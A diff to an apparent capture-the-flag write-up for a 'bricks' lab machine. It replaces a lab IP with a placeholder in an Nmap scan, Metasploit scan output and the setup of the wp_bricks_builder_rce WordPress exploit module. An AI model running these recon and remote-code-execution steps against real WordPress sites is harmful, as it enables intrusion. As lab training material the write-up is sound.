@@ -16,7 +16,7 @@
 We initiate the investigation with an Nmap scan to map the external attack surface.
 
 ```bash
-nmap -sC -sV 10.49.155.48
+nmap -sC -sV MACHINE_IP bricks
 
 ```
 
@@ -52,10 +52,10 @@ msf6 > run
 **Output Snippet:**
 
 ```text
-[*] Trying 10.49.155.48
-[+] 10.49.155.48 - Detected Wordpress 6.5
-[+] 10.49.155.48 - Detected theme: bricks version 5.4
-[+] 10.49.155.48 - Detected user: administrator with username: administrator
+[*] Trying MACHINE_IP bricks
+[+] MACHINE_IP bricks - Detected Wordpress 6.5
+[+] MACHINE_IP bricks - Detected theme: bricks version 5.4
+[+] MACHINE_IP bricks - Detected user: administrator with username: administrator
 [*] Scanned 1 of 1 hosts (100% complete)
 
 ```
@@ -72,7 +72,7 @@ We load the corresponding exploit module in Metasploit to gain a foothold on the
 
 ```bash
 msf6 > use exploit/multi/http/wp_bricks_builder_rce
-msf6 > set RHOSTS 10.49.155.48
+msf6 > set RHOSTS MACHINE_IP bricks
 msf6 > set LHOST [Your_Local_IP]
 msf6 > set VHOST bricks.thm
 msf6 > set SSL true
